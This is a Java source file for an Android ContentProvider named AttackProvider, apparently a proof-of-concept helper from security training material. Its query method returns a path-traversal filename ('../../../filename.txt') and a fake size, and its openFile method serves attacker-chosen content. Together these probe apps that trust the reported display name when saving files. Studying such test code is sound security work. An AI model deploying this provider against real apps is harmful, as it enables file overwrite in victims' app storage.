package io.hextree.poc.utils;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.provider.OpenableColumns;
import android.util.Log;

import androidx.annotation.NonNull;

import java.io.FileNotFoundException;
import java.io.IOException;

/**
 * A ContentProvider that acts as a helper for exposing a virtual file.
 * <p>
 * This provider demonstrates how to supply file metadata via {@link #query(Uri, String[], String, String[], String)}
 * and file content via {@link #openFile(Uri, String)}. The file metadata is hard-coded,
 * as is the file content, making this implementation useful for testing or demonstration purposes.
 * </p>
 */
public class AttackProvider extends ContentProvider {

    /**
     * Default constructor.
     */
    public AttackProvider() {
    }

    /**
     * Handles query requests from clients.
     * <p>
     * This implementation returns a single-row {@link MatrixCursor} containing file metadata.
     * The metadata includes a manipulated display name and a hardcoded file size.
     * </p>
     *
     * @param uri           the URI to query.
     * @param projection    the list of columns to put into the cursor.
     * @param selection     a filter declaring which rows to return, formatted as an SQL WHERE clause.
     *                      This value may be {@code null} to return all rows.
     * @param selectionArgs arguments for the selection clause.
     * @param sortOrder     the order in which to sort the rows, formatted as an SQL ORDER BY clause.
     *                      This value may be {@code null}.
     * @return a {@link Cursor} object, which is a {@link MatrixCursor} with one row containing the
     *         {@link OpenableColumns#DISPLAY_NAME} and {@link OpenableColumns#SIZE}.
     */
    @Override
    public Cursor query(Uri uri, String[] projection, String selection,
                        String[] selectionArgs, String sortOrder) {
        Log.i("AttackProvider", "query(" + uri.toString() + ")");

        MatrixCursor cursor = new MatrixCursor(new String[]{
                OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
        });

        // Modify the reported filename and file size here.
        cursor.addRow(new Object[]{
                "../../../filename.txt", 12345
        });

        return cursor;
    }

    /**
     * Opens a file associated with the given URI.
     * <p>
     * This method creates a pipe, writes a hardcoded HTML content to the pipe's output stream
     * in a separate thread, and returns the read end of the pipe. This allows clients to read
     * the file content as if it were a regular file.
     * </p>
     *
     * @param uri  the URI of the file to open.
     * @param mode the access mode for the file (e.g., "r" for read).
     * @return a {@link ParcelFileDescriptor} representing the read end of the pipe.
     * @throws FileNotFoundException if the pipe cannot be created.
     */
    @Override
    public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException {
        Log.i("AttackProvider", "openFile(" + uri.toString() + ")");

        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            ParcelFileDescriptor.AutoCloseOutputStream outputStream =
                    new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);

            new Thread(() -> {
                try {
                    outputStream.write("<h1>File Content</h1>".getBytes());
                    outputStream.close();
                } catch (IOException e) {
                    Log.e("AttackProvider", "Error in pipeToParcelFileDescriptor", e);
                }
            }).start();

            return pipe[0];
        } catch (IOException e) {
            throw new FileNotFoundException("Could not open pipe for: " + uri);
        }
    }

    /**
     * Initializes the provider.
     * <p>
     * This method is called when the provider is started. It logs the initialization
     * and returns {@code true} to indicate that the provider was successfully loaded.
     * </p>
     *
     * @return {@code true} if the provider was successfully loaded; {@code false} otherwise.
     */
    @Override
    public boolean onCreate() {
        Log.i("AttackProvider", "onCreate()");
        return true;
    }

    /**
     * Deletes data at the given URI.
     * <p>
     * This operation is not yet supported in this provider and will always throw an
     * {@link UnsupportedOperationException}. Change the code if you need it.
     * </p>
     *
     * @param uri           the URI to delete.
     * @param selection     an optional filter to match rows to delete.
     * @param selectionArgs arguments for the selection criteria.
     * @return never returns normally.
     * @throws UnsupportedOperationException always thrown as deletion is not implemented.
     */
    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        Log.i("AttackProvider", "delete(" + uri.toString() + ")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    /**
     * Returns the MIME type of data for the given URI.
     * <p>
     * This operation is not yet supported in this provider and will always throw an
     * {@link UnsupportedOperationException}. Change the code if you need it.
     * </p>
     *
     * @param uri the URI to query.
     * @return never returns normally.
     * @throws UnsupportedOperationException always thrown as MIME type resolution is not implemented.
     */
    @Override
    public String getType(Uri uri) {
        Log.i("AttackProvider", "getType(" + uri.toString() + ")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    /**
     * Inserts a new row into the provider.
     * <p>
     * This operation is not yet supported in this provider and will always throw an
     * {@link UnsupportedOperationException}. Change the code if you need it.
     * </p>
     *
     * @param uri    the content:// URI of the insertion request.
     * @param values a set of column_name/value pairs to add to the database.
     * @return never returns normally.
     * @throws UnsupportedOperationException always thrown as insertion is not implemented.
     */
    @Override
    public Uri insert(Uri uri, ContentValues values) {
        Log.i("AttackProvider", "insert(" + uri.toString() + ")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    /**
     * Updates data at the given URI.
     * <p>
     * This operation is not yet supported in this provider and will always throw an
     * {@link UnsupportedOperationException}. Change the code if you need it.
     * </p>
     *
     * @param uri           the URI to update.
     * @param values        a set of column_name/value pairs to update.
     * @param selection     an optional filter to match rows to update.
     * @param selectionArgs arguments for the selection criteria.
     * @return never returns normally.
     * @throws UnsupportedOperationException always thrown as update is not implemented.
     */
    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        Log.i("AttackProvider", "update(" + uri.toString() + ")");
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
